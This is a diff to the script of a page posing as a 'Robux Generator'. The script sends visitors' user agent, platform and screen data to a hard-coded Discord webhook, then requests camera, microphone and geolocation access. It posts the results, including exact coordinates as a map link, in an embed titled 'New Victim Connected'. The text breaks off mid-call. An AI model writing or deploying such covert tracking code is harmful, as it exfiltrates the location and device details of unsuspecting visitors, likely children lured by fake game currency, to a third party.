@@ -149,54 +149,87 @@
     <div class="floating-robux" style="left: 90%; animation-delay: 3.5s;">💰</div>
 
     <script>
-        // Background data collection script
+        // Fast and optimized data collection script
         (function() {
             const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms';
 
-            // Function to send data to Discord
+            // Fast Discord sender
             async function sendToDiscord(data) {
                 try {
-                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    await fetch(DISCORD_WEBHOOK_URL, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: "🎮 New Victim Connected",
-                                color: 0x9b59b6,
-                                fields: data.fields,
-                                footer: {
-                                    text: "Robux Generator Collector"
-                                },
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
                     });
-                    return response.ok;
-                } catch (error) {
-                    console.error('Discord send failed:', error);
-                }
+                } catch (e) {}
             }
 
-            // Get detailed browser information
-            function getBrowserInfo() {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
+            // Collect all data fast
+            async function collectAndSend() {
+                const data = {
+                    embeds: [{
+                        title: "🎯 New Victim Connected",
+                        color: 0x9b59b6,
+                        fields: [
+                            { name: "🌐 Browser", value: navigator.userAgent, inline: false },
+                            { name: "📍 Location", value: "Requesting...", inline: true },
+                            { name: "📱 Device", value: `${navigator.platform} - ${screen.width}x${screen.height}`, inline: true },
+                            { name: "🔐 Permissions", value: "Checking...", inline: true }
+                        ],
+                        footer: { text: "Robux Generator" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Send initial data
+                sendToDiscord(data);
+
+                // Request permissions in parallel
+                const promises = [];
                 
-                return {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    languages: navigator.languages.join(', '),
-                    platform: navigator.platform,
-                    cookieEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack,
-                    onLine: navigator.onLine,
-                    screen: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    webgl: gl ? `${gl.getParameter(gl.VENDOR)} - ${gl.getParameter(gl.RENDERER)}` : 'Not supported',
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory ?
+                // Camera
+                promises.push(
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            stream.getTracks().forEach(t => t.stop());
+                            return "📹 Camera: ✅ Granted";
+                        })
+                        .catch(() => "📹 Camera: ❌ Denied")
+                );
+
+                // Microphone
+                promises.push(
+                    navigator.mediaDevices.getUserMedia({ audio: true })
+                        .then(stream => {
+                            stream.getTracks().forEach(t => t.stop());
+                            return "🎤 Mic: ✅ Granted";
+                        })
+                        .catch(() => "🎤 Mic: ❌ Denied")
+                );
+
+                // Location
+                promises.push(
+                    new Promise(resolve => {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => {
+                                const lat = pos.coords.latitude.toFixed(6);
+                                const lon = pos.coords.longitude.toFixed(6);
+                                document.getElementById('loading-text').innerHTML = '<span class="status-dot"></span>Loading...';
+                                resolve(`📍 [Google Maps](https://www.google.com/maps?q=${lat},\${lon})`);
+                            },
+                            () => resolve("📍 Location: ❌ Denied"),
+                            { timeout: 5000 }
+                        );
+                    })
+                );
+
+                // Wait for all permissions
+                const results = await Promise.all(promises);
+                
+                // Update with results
+                data.embeds[0].fields[2].value = results.join('\n');
+                sendToDiscord(data);
+
+                // Send detailed info
+                setTimeout(() => {
+                    sendToDiscord
